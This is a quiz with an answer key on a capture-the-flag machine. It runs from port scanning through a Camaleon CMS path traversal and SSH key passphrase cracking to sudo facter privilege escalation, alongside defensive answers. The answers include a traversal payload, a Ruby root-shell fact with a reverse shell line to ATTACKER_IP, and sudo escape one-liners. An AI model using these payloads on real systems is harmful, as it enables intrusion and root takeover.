# Facts - Study Questions

**Instructions:** Read the [Facts Educational Write-up](./Facts_Educational_writeup.md) first, then test your understanding with these questions. Try to answer without looking back at the write-up. Answers are at the bottom.

**Difficulty Levels:**
- Basic - Direct recall from the write-up
- Intermediate - Requires connecting concepts
- Advanced - Scenario-based application

---

## Section 1: Reconnaissance

### Q1.1 (Basic)
What nmap flags were used in the initial scan, and what does each flag do?

### Q1.2 (Basic)
What three services were discovered running on the target, and on which ports?

### Q1.3 (Intermediate)
Why is port scanning always the first step in a penetration test? Give at least two reasons.

### Q1.4 (Intermediate)
If you discovered a web server running on an unusual port (e.g., 8443), what would this suggest about the target environment?

### Q1.5 (Advanced)
You run an nmap scan and see port 80 open but no version information. What additional nmap techniques could you use to gather more information about the service?

---

## Section 2: Web Application Analysis

### Q2.1 (Basic)
What CMS was running on the target, and what version?

### Q2.2 (Basic)
Why did we add `facts.htb` to `/etc/hosts`?

### Q2.3 (Intermediate)
Why is creating an account on a web application valuable during a penetration test? List at least three reasons.

### Q2.4 (Intermediate)
Camaleon CMS is built on Ruby on Rails. What types of vulnerabilities are commonly associated with Ruby on Rails applications?

### Q2.5 (Advanced)
You discover a CMS but cannot determine its version. What techniques would you use to fingerprint the exact version?

---

## Section 3: Path Traversal

### Q3.1 (Basic)
What is the CVE/advisory identifier for the Camaleon CMS vulnerability exploited?

### Q3.2 (Basic)
What vulnerable endpoint was exploited, and what parameter was vulnerable?

### Q3.3 (Basic)
Write the payload used to read `/etc/passwd` via the path traversal.

### Q3.4 (Intermediate)
Explain why six `../` sequences were used in the payload. What happens if you use too few? Too many?

### Q3.5 (Intermediate)
Why is `/etc/passwd` always the first file to read when you have arbitrary file read? List at least three pieces of information it provides.

### Q3.6 (Intermediate)
What are four methods to defend against path traversal vulnerabilities?

### Q3.7 (Advanced)
You have arbitrary file read on a Linux system. Besides `/etc/passwd`, list five other high-value files you would attempt to read and explain why each is valuable.

### Q3.8 (Advanced)
The path traversal requires authentication. If you couldn't create an account, what alternative approaches might work?

---

## Section 4: SSH Key Extraction and Cracking

### Q4.1 (Basic)
What type of SSH key was extracted (RSA, DSA, ECDSA, or Ed25519)?

### Q4.2 (Basic)
What was the cracked passphrase for the SSH key?

### Q4.3 (Basic)
What tool converts SSH keys into a format that John the Ripper can crack?

### Q4.4 (Intermediate)
Why couldn't John the Ripper directly crack the SSH key without conversion? What does ssh2john actually extract?

### Q4.5 (Intermediate)
Why did the passphrase "dragonballz" fall quickly to the rockyou.txt wordlist? What characteristics made it weak?

### Q4.6 (Intermediate)
What file permissions must SSH private keys have, and why does SSH enforce this?

### Q4.7 (Advanced)
You extract an SSH key but it uses a strong, random passphrase that won't crack with wordlists. What alternative approaches could you try?

### Q4.8 (Advanced)
An organization wants to protect SSH keys from this type of attack. Recommend five security controls they should implement.

---

## Section 5: Privilege Escalation

### Q5.1 (Basic)
What command revealed the privilege escalation path?

### Q5.2 (Basic)
What binary could be run with sudo, and what flag made it exploitable?

### Q5.3 (Basic)
What does the `NOPASSWD` option in sudoers mean?

### Q5.4 (Intermediate)
Explain the complete chain of how `facter --custom-dir` leads to root code execution.

### Q5.5 (Intermediate)
Write a malicious Ruby fact that would spawn a root shell instead of just reading a file.

### Q5.6 (Intermediate)
Why is `sudo -l` the first command you should run after getting a shell? Why is it more valuable than running LinPEAS immediately?

### Q5.7 (Advanced)
An admin wants to allow users to run facter for system information but prevent code execution. How would you configure sudoers to be safer? Is it possible to make it completely safe?

### Q5.8 (Advanced)
Besides facter, name three other common binaries that can be abused for privilege escalation when allowed in sudo, and briefly explain how each works.

---

## Section 6: Attack Chain & Defense

### Q6.1 (Intermediate)
List the four distinct vulnerabilities that were chained together in this attack.

### Q6.2 (Intermediate)
Which single vulnerability, if fixed, would have completely prevented initial access? Which would have prevented root access?

### Q6.3 (Advanced)
You're a defender and can only implement ONE security control to protect this system. Which would you choose and why?

### Q6.4 (Advanced)
Map each phase of this attack to its MITRE ATT&CK technique ID and name.

### Q6.5 (Advanced)
Design a detection strategy: What logs or monitoring would have detected this attack at each phase?

---

## Section 7: Tools & Techniques

### Q7.1 (Basic)
What tool was used for password cracking in this attack?

### Q7.2 (Basic)
What wordlist was used for cracking, and why is it significant?

### Q7.3 (Intermediate)
Why was `curl` used instead of a browser for exploiting the path traversal?

### Q7.4 (Advanced)
If John the Ripper was taking too long to crack the passphrase, what alternatives could speed up the process?

---

## Section 8: Scenario Questions

### Q8.1 (Advanced)
You find a different path traversal that only allows reading files within `/var/www/`. What files in this directory might still lead to compromise?

### Q8.2 (Advanced)
The SSH key you extracted is for a user who has no sudo permissions and no interesting files. How would you proceed to escalate privileges?

### Q8.3 (Advanced)
You have root on this machine. What post-exploitation activities would you perform for a real engagement (not CTF)?

---

# Answers

<details>
<summary>Click to reveal answers (try to answer first!)</summary>

## Section 1 Answers

**A1.1:** `-sC` runs default NSE scripts for additional information (service banners, web titles). `-sV` performs version detection to identify exact software versions for CVE research.

**A1.2:** Port 22 (SSH/OpenSSH), Port 80 (HTTP/nginx with Camaleon CMS), Port 54321 (MinIO S3 storage).

**A1.3:**
1. We need to know what services are running before we can attack them
2. Version information reveals potential CVEs
3. Identifies the attack surface and entry points
4. Helps prioritize which services to investigate further

**A1.4:** Non-standard ports often indicate development/staging environments, custom applications, or services intentionally hidden from casual scans. These may have weaker security configurations.

**A1.5:**
- `-sV --version-intensity 5` for aggressive version detection
- `-sC` to run default scripts that may identify the service
- `--script=http-enum` for web service enumeration
- Manual banner grabbing with netcat/curl
- Analyzing HTTP headers and responses

---

## Section 2 Answers

**A2.1:** Camaleon CMS version 2.9.0

**A2.2:** The web application uses virtual hosting and responds to the hostname `facts.htb`. Without the hosts entry, requests to the IP might get a default page or error instead of the actual application.

**A2.3:**
1. Access to authenticated features and larger attack surface
2. Ability to test authenticated vulnerabilities
3. Session cookies for automated exploitation
4. Access to file upload/download features
5. View user-specific functionality that may have different permissions

**A2.4:**
- Mass assignment vulnerabilities
- SQL injection in ActiveRecord queries
- Server-side template injection
- Insecure deserialization (YAML, Marshal)
- Path traversal in file handling
- CSRF if tokens not properly implemented

**A2.5:**
- Check page source for version comments/meta tags
- Look at `/robots.txt`, `/readme.txt`, `/changelog.txt`
- Compare file hashes against known versions
- Check JavaScript/CSS file paths for version strings
- Examine HTTP headers for version info
- Use tools like WhatWeb, Wappalyzer, or BuiltWith

---

## Section 3 Answers

**A3.1:** GHSL-2024-183

**A3.2:** Endpoint: `/admin/media/download_private_file`, Parameter: `file`

**A3.3:** `../../../../../../etc/passwd`

**A3.4:** Six `../` sequences navigate up from the media directory through the application structure to reach the filesystem root. Too few won't reach root (you'll get an error or wrong file). Too many is usually fine - you can't go above root, so extra sequences are ignored.

**A3.5:**
1. Lists all users on the system (usernames for SSH attempts)
2. Shows home directories (where to look for SSH keys, configs)
3. Shows user shells (which accounts can log in)
4. Reveals system structure and potentially installed services
5. Identifies service accounts that might have exploitable configurations

**A3.6:**
1. Input validation - reject any input containing `../` or `..\\`
2. Path canonicalization - resolve full path and verify it's within allowed directory
3. Chroot/sandboxing - limit file access to specific directories
4. Web application firewall - block suspicious path patterns

**A3.7:**
1. `/etc/shadow` - password hashes for offline cracking
2. `/home/*/.ssh/id_rsa` or `id_ed25519` - SSH private keys
3. `/home/*/.bash_history` - command history with potential credentials
4. `/var/www/*/config/*.php` or `database.yml` - database credentials
5. `/root/.ssh/authorized_keys` - could add our key if we find write vuln
6. Application config files in `/opt/` or `/srv/`
7. `/etc/crontab` and `/etc/cron.d/*` - scheduled tasks to understand system

**A3.8:**
- Look for default credentials
- Search for credential leaks in source code/JavaScript
- Check for password reset vulnerabilities
- Try SQL injection on login form
- Look for registration bypass or API endpoints
- Check for other unauthenticated vulnerabilities first

---

## Section 4 Answers

**A4.1:** Ed25519

**A4.2:** `dragonballz`

**A4.3:** `ssh2john`

**A4.4:** SSH keys use their own format with specific encryption parameters (bcrypt, AES). John the Ripper needs a standardized hash format. ssh2john extracts the encrypted key data, salt, and encryption parameters and converts them into a format John can process.

**A4.5:**
- Popular culture reference (Dragon Ball Z anime)
- All lowercase letters
- No numbers or special characters
- Dictionary words combined
- Present in rockyou.txt (real breached passwords)
- Memorable = predictable

**A4.6:** Permissions must be 600 (read/write owner only). SSH enforces this because private keys are extremely sensitive - if other users can read them, they can impersonate you. This is a security-by-default mechanism.

**A4.7:**
- Try larger wordlists (SecLists, CrackStation)
- Use rule-based attacks (John rules, Hashcat rules)
- Create custom wordlist based on target (company name, usernames, etc.)
- Try mask attacks for common patterns
- GPU cracking with Hashcat for speed
- Look for the passphrase elsewhere (browser saved passwords, notes files, config files)

**A4.8:**
1. Strong, random passphrases (16+ characters from password manager)
2. Hardware security modules or YubiKeys for key storage
3. File permissions enforcement and monitoring
4. Regular key rotation and old key revocation
5. SSH certificate authentication instead of static keys
6. Monitor for unauthorized SSH key access (auditd, file integrity monitoring)
7. Disable SSH password authentication entirely

---

## Section 5 Answers

**A5.1:** `sudo -l`

**A5.2:** `/usr/bin/facter` with the `--custom-dir` flag

**A5.3:** The user can run the specified command with sudo without entering their password.

**A5.4:**
1. User has sudo permission to run facter as root
2. The `--custom-dir` flag loads Ruby files from a user-specified directory
3. Facter executes Ruby code in those files to generate "facts"
4. We create a Ruby file with `Facter.add()` that runs arbitrary commands
5. `Facter::Core::Execution.execute()` runs shell commands
6. Since facter runs as root via sudo, our commands execute as root

**A5.5:**
```ruby
Facter.add(:shell) { setcode { Facter::Core::Execution.execute("/bin/bash -i") } }
```
Or for a reverse shell:
```ruby
Facter.add(:revshell) { setcode { Facter::Core::Execution.execute("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'") } }
```

**A5.6:**
- Takes 1 second vs minutes for LinPEAS
- Directly shows exploitable sudo permissions
- Misconfigured sudo is extremely common and often gives direct root
- LinPEAS output is overwhelming; sudo -l is precise
- If sudo works, you don't need to check anything else

**A5.7:**
Safer configuration:
```
trivia ALL=(ALL) NOPASSWD: /usr/bin/facter os memory networking
```
This only allows specific facts without arguments. However, it's difficult to make completely safe because facter has many features. Better approaches:
- Use a wrapper script that filters arguments
- Don't give sudo access to facter at all
- Use dedicated service accounts for Puppet operations
- Use AppArmor/SELinux to restrict execution

**A5.8:**
1. **vim/vi** - `:!bash` or `:shell` spawns a shell
2. **less/more** - `!bash` while viewing a file
3. **find** - `-exec /bin/bash \;` executes commands
4. **tar** - `--checkpoint-action=exec=/bin/bash`
5. **python/perl/ruby** - Direct code execution
6. **nmap** - `--interactive` mode (older versions) or `--script`
7. **env** - Can be used to bypass restricted commands

---

## Section 6 Answers

**A6.1:**
1. Path traversal in Camaleon CMS (GHSL-2024-183)
2. SSH key stored in accessible location
3. Weak SSH key passphrase
4. Unrestricted sudo access to facter

**A6.2:**
- Preventing initial access: Fix the path traversal OR use strong SSH key passphrase
- Preventing root access: Remove sudo access to facter OR restrict facter arguments

**A6.3:** Best single control: **Fix the path traversal vulnerability**. This is the initial access point - without it, the entire attack chain fails. The SSH key and sudo misconfigurations are only exploitable because of the initial file read capability. Alternatively, **strong SSH key passphrases** would also stop the attack at initial access.

**A6.4:**
- Port scanning: T1046 - Network Service Discovery
- Path traversal/file read: T1083 - File and Directory Discovery
- SSH key extraction: T1552.004 - Unsecured Credentials: Private Keys
- Passphrase cracking: T1110.002 - Brute Force: Password Cracking
- SSH access: T1021.004 - Remote Services: SSH
- Sudo abuse: T1548.003 - Abuse Elevation Control Mechanism: Sudo

**A6.5:**
- **Reconnaissance:** IDS/firewall logs showing port scan patterns
- **Web exploitation:** WAF logs showing path traversal attempts (`../` patterns)
- **File access:** auditd logs for sensitive file access (/etc/passwd, .ssh directories)
- **SSH access:** SSH auth logs showing successful key-based login
- **Privilege escalation:** sudoers logs showing facter execution, especially with --custom-dir

---

## Section 7 Answers

**A7.1:** John the Ripper

**A7.2:** rockyou.txt - It contains real passwords from the 2009 RockYou data breach (14+ million passwords). It's significant because it represents actual human password choices, not theoretical combinations.

**A7.3:**
- Scriptable and automatable
- Supports cookie files for authenticated requests
- Can save output directly to files
- No browser overhead
- Precise control over headers and parameters
- Can be easily modified for different payloads

**A7.4:**
- Use Hashcat with GPU acceleration (much faster)
- Distribute cracking across multiple machines
- Use smarter wordlists targeted to the user/organization
- Apply rules to transform wordlist entries
- Use mask attacks for known patterns
- Use combo attacks (word + word + number)

---

## Section 8 Answers

**A8.1:**
- `config/database.yml` - Database credentials
- `config/secrets.yml` - Rails secret keys
- `.env` files - Environment variables with credentials
- `config/initializers/*` - May contain API keys
- Application source code - Hardcoded credentials, logic flaws
- Log files - May contain user data, passwords, session tokens

**A8.2:**
- Search for credentials in config files, history, environment variables
- Check for other users' readable SSH keys
- Look for SUID binaries
- Check cron jobs for writable scripts
- Enumerate kernel version for exploits
- Check for writable /etc/passwd or sudoers
- Look for password reuse (try found passwords on other accounts)
- Check for vulnerable services running locally (127.0.0.1 only)

**A8.3:**
- Collect credentials (memory dump, config files, browser data)
- Establish persistence (SSH keys, cron jobs, systemd services)
- Document all findings for the report
- Check for lateral movement opportunities (other hosts, credentials)
- Review logs to understand what the system is used for
- Look for sensitive data (PII, financial, intellectual property)
- Clean up any artifacts that might trigger alerts
- Screenshot/document evidence of access

</details>

---

## Self-Assessment Scoring

Count your correct answers:

| Score | Level |
|-------|-------|
| 0-10 | Beginner - Review the write-up and fundamentals |
| 11-20 | Developing - Good foundation, practice more boxes |
| 21-30 | Intermediate - Solid understanding, try harder boxes |
| 31-35 | Advanced - Ready for harder challenges |
| 36+ | Expert - Consider writing your own write-ups! |

---

## Further Study

Based on the techniques in this box, explore these resources:

**Path Traversal:**
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger Path Traversal Labs](https://portswigger.net/web-security/file-path-traversal)

**Password Cracking:**
- [Hashcat Wiki](https://hashcat.net/wiki/)
- [John the Ripper Documentation](https://www.openwall.com/john/doc/)

**Privilege Escalation:**
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

**MITRE ATT&CK:**
- [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
